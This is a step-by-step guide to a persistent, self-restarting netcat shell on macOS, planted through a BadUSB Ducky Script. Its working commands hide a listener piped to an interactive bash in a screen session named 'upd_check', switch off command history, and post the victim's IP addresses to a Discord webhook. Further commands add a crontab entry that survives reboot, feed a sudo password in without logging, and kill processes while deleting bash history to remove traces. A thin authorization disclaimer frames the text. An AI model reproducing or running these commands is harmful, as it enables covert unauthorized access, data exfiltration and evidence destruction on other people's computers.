# **Mac Endless Reverse Shell**

### **Introduction**

This guide provides step-by-step instructions for setting up an interactive reverse shell on MacOS systems using **`nc`** (netcat). It is intended for educational purposes or authorized security testing only. Unauthorized access to computer systems is illegal and unethical. Please ensure you have proper authorization before attempting any actions described in this guide.

For additional commands and data on reverse shells, refer to the [HackTricks documentation](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys#full-tty).

## **Setup Instructions**

---

### **1. Establishing the Reverse Shell on the Target Machine via BadUSB**

**Objective:** Start a reverse shell listener on the target machine as a background process using **`screen`**.

`unset HISTFILE; screen -dmS upd_check bash -c 'unset HISTFILE; set +o history; trap "pkill -P \$\$" SIGINT SIGTERM; while true; do rm -f /tmp/f; mkfifo /tmp/f; nc -l 9123 < /tmp/f | bash -i > /tmp/f 2>&1 & nc_pid=$!; (sleep 300 && kill -9 $nc_pid 2>/dev/null) & wait $nc_pid; done'`

**Description**:

- **`screen -dmS upd_check`**: Starts a detached screen session named "upd_check" to run the following command.
- **`bash -c '...'`**: Launches a Bash shell and executes the provided command within it.
- **`unset HISTFILE`**: Prevents Bash from saving command history to a file.
- **`set +o history`**: Disables command history for the current shell session.
- **`trap "pkill -P \$\$" SIGINT SIGTERM`**: Sets up a trap to kill any child processes spawned by the command upon receiving SIGINT or SIGTERM signals (e.g., Ctrl+C).
- **`while true; do ... done`**: Creates an infinite loop to continuously execute the following commands.
- **`rm -f /tmp/f`**: Removes any existing FIFO file named "/tmp/f".
- **`mkfifo /tmp/f`**: Creates a new FIFO (named pipe) file named "/tmp/f" for communication.
- **`nc -l 9123 < /tmp/f | bash -i > /tmp/f 2>&1 &`**: Sets up a netcat listener on port 9123, redirecting input/output to the FIFO file, and starts a Bash shell with interactive mode (-i).
- **`nc_pid=$!`**: Stores the process ID (PID) of the netcat listener.
- **`(sleep 300 && kill -9 $nc_pid 2>/dev/null) &`**: Initiates a background process to sleep for 300 seconds (5 minutes) and then forcibly terminates the netcat listener process to trigger automatic reconnection.
- **`wait $nc_pid`**: Pauses execution until the netcat listener process terminates.

Then, send the external and internal IP addresses of the machine to a Discord channel. Replace **`YOUR_DISCORD_CHANNEL_TOKEN`** with your token inside the Ducky Script:


`external_ip=$(curl -s [ifconfig.me](http://ifconfig.me/)); internal_ips=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | sed 's/inet //' | paste -sd "," -); json_payload="{\"content\": \"From Endless Reverse Shell BadUSB:\\nExternal IP: $external_ip\\nInternal IP(s): $(echo $internal_ips | sed 's/,/, /g')\\n----------------------------------------\"}"; curl -X POST -H "Content-Type: application/json" -d "$json_payload" "YOUR_DISCORD_CHANNEL_TOKEN" && unset external_ip internal_ips`

Not part of the Ducky Payload. For increased persistence, set the command as a crontab job (TCC permission is needed):
`@reboot /bin/bash -c 'unset HISTFILE; set +o history; trap "pkill -P \$\$" SIGINT SIGTERM; while true; do rm -f /tmp/f; mkfifo /tmp/f; (nc -l 9123 < /tmp/f | bash -i > /tmp/f 2>&1 || true) & nc_pid=$!; (sleep 300 && kill -9 $nc_pid 2>/dev/null || true) & wait $nc_pid; done'`

---

### **2. Configuring the Attacker's Machine**

**Objective:** Secure the reverse shell connection and prevent accidental disconnections.

- **Disable accidental interrupts:** Prevents the use of Ctrl+C from terminating the shell.

`stty intr ''  # Disable Ctrl+C`

- **Restore interrupt key:** Re-enables Ctrl+C functionality when needed.

`stty intr ^C # To reset`

- **Connecting:** Utilize **`rlwrap`** for a better shell experience when connecting to the target.

`rlwrap -r nc [TARGET_IP] 9123`

---

### **3. Managing the Session on the Victim's Machine**

**Objective:** Maintain stealth and control within the session.

- **Standard Shell Environment:** Enhances the shell for command execution without leaving history.
    
    `script -q /dev/null bash
    unset HISTFILE; set +o history && export PS1='\u@\h:\w\$'`
    
- **Executing Privileged Commands:** Executes commands as **`sudo`** without logging.
    
    `unset HISTFILE; set +o history && echo "password" | sudo -S whoami` 
    
- **Root Access:** Switch to root without command logging.
    
    `unset HISTFILE`
    

---

### **4. Cleanup on the Victim Machine**

**Objective:** Remove traces of the reverse shell session and terminate gracefully.

- **Command for cleanup processes that related to reverse shell:**

`nohup bash -c 'screen -S upd_check -X quit; sleep 3; screen -wipe; pkill -f "nc -l 9123"; ps aux | grep "[b]ash -i" | grep -v grep | awk "{print \$2}" | xargs -r kill -9; rm -f /tmp/f; rm -f ~/.bash_history' > /dev/null 2>&1 &`

- **Verification:** Confirm that all related processes are terminated and no listeners are active.

`ps aux | grep bash`

`screen -list`

`lsof -i :9123`

---

### **Important Note:**

The procedure incorporates an automatic re-establishment mechanism for the reverse shell connection every 5 minutes. This feature proves particularly valuable in scenarios where the reverse shell may be disrupted due to network instability or accidental closure of the initial connection. By utilizing a loop that periodically terminates the existing **`nc`** listener and initiates a new one, the command ensures that the attacker can regain access to the target machine without the need to redeploy the payload. This auto-reconnect functionality enhances the resilience of the reverse shell to disconnections and reinforces its persistence on the target machine, guaranteeing that temporary disruptions do not permanently sever the attacker's access.

### ***This procedure prioritizes operational discretion and effectiveness. Ensure you possess authorized access to the system before proceeding with this setup.***